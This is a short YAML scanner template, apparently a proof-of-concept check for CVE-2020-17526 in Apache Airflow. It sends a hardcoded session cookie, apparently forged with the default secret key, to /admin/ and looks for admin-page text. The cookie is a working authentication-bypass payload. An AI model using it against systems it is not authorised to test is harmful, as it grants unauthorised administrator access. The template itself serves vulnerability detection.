name: yaml-poc-apache-airflow-other-CVE-2020-17526
binding: d3890acd-91ee-4120-84e9-290336fc76b2
detail:
    author: jiapeng.han
    links:
        - http://www.openwall.com/lists/oss-security/2020/12/21/1
        - https://lists.apache.org/thread.html/r466759f377651f0a690475d5a52564d0e786e82c08d5a5730a4f8352@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/rbeeb73a6c741f2f9200d83b9c2220610da314810c4e8c9cf881d47ef%40%3Cusers.airflow.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2020-17526
        - https://vigilance.fr/vulnerability/Apache-Airflow-user-access-via-Session-Validation-Alternative-Site-38534
        - https://www.cybersecurity-help.cz/vdb/SB2022060724
    vulnerability:
        id: 23ddfe2d-8d3d-4e58-8922-7a644962bf55
        level: high
    warning: Harmless
transport: http
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /admin/
            headers:
                Cookie: session=.eJwlzUEOwiAQRuG7zLoLpgMM9DIE6D-xqdEEdGW8u03cvy_vQ8UG5o02q_eJhcqx00YdDaKao6p5ZZe89ZyFUaPExqCF-hxWXs8Tj6tXt_rGnKpxC6vviTNiELBxErerBBZk9Zd7T4z_hOn7A0cWI94.YwJ5bw.LzJjDflCTQE2BfJ7kXcsOi49vvY
            follow_redirects: true
        expression: response.body_string.contains("DAGs") && response.body_string.contains("Users") && response.body_string.contains("SLA Misses") && response.body_string.contains("Task Instances")
expression: r1()
